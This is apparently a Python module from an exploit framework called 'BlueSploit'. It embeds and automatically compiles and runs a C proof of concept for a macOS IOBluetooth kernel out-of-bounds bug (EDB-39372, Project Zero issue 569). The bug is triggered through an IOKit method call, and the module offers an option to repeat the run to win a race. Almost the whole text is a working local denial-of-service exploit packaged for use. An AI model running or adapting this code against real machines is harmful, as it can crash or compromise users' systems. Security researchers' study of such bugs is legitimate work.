"""
BlueSploit Module: macOS IOBluetoothHCIUserClient OOB Demux Race
EDB-ID: 39372  (Project Zero issue 569, ianbeer)
OS X 10.11 (El Capitan)

Original C PoC embedded verbatim; compiled and run at module execution time.
"""

from core.base import (
    DosModule, ModuleInfo, ModuleOption,
    BTProtocol, Severity,
)
from core.utils.printer import print_error, print_info, print_warning, Colors
from core.utils.c_runner import compile_and_run, find_compiler
from core.utils.iokit import is_macos


C_SOURCE = r"""
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <IOKit/IOKitLib.h>

int main(int argc, char** argv) {
  kern_return_t err;
  io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
                          IOServiceMatching("IOBluetoothHCIController"));
  if (service == IO_OBJECT_NULL) { printf("no service\n"); return 0; }

  io_connect_t conn = MACH_PORT_NULL;
  err = IOServiceOpen(service, mach_task_self(), 0, &conn);
  if (err != KERN_SUCCESS) { printf("open failed\n"); return 0; }

  uint64_t inputScalar[16];
  uint64_t inputScalarCnt = 0;
  char inputStruct[4096];
  size_t inputStructCnt = 1;
  memset(inputStruct, 'A', inputStructCnt);
  uint64_t outputScalar[16];
  uint32_t outputScalarCnt = 0;
  char outputStruct[4096];
  size_t outputStructCnt = 0;

  err = IOConnectCallMethod(conn, 21, inputScalar, inputScalarCnt,
                            inputStruct, inputStructCnt,
                            outputScalar, &outputScalarCnt,
                            outputStruct, &outputStructCnt);
  printf("err: 0x%x\n", err);
  return 0;
}
"""


class Module(DosModule):
    info = ModuleInfo(
        name="dos/macos_iobt_oob_demux",
        description="macOS IOBluetooth SimpleDispatchWL OOB demux (EDB-39372, native C)",
        author=["ianbeer (Project Zero)"],
        protocol=BTProtocol.CLASSIC,
        severity=Severity.HIGH,
        references=[
            "https://www.exploit-db.com/exploits/39372",
            "https://bugs.chromium.org/p/project-zero/issues/detail?id=569",
        ],
    )

    def _setup_options(self) -> None:
        self.options = {
            "iterations": ModuleOption(
                name="iterations", required=False, default=1,
                description="How many times to launch the binary (race amplification)",
            ),
        }

    def run(self) -> bool:
        C = Colors
        iters = int(self.get_option("iterations"))
        print(f"\n  {C.RED}{'─'*55}{C.RESET}")
        print(f"  {C.BOLD}macOS IOBluetooth OOB Demux Race (EDB-39372){C.RESET}")
        print(f"  {C.RED}{'─'*55}{C.RESET}")
        if not is_macos():
            print_error("macOS only")
            return False
        if not find_compiler():
            print_error("No C compiler, install Xcode CLI tools")
            return False
        print_warning("Race condition, may need many runs to win")

        last_rc = -1
        for i in range(iters):
            rc, out, err = compile_and_run(
                C_SOURCE, "iobt_oob_demux",
                ldflags=["-framework", "IOKit"],
            )
            last_rc = rc
            if rc == -1:
                print_error(err.strip())
                return False
            if i == 0 or i == iters - 1:
                print_info(f"[{i+1}/{iters}] {out.strip()}")

        self.add_result({"edb_id": 39372, "iterations": iters, "rc": last_rc})
        return last_rc == 0
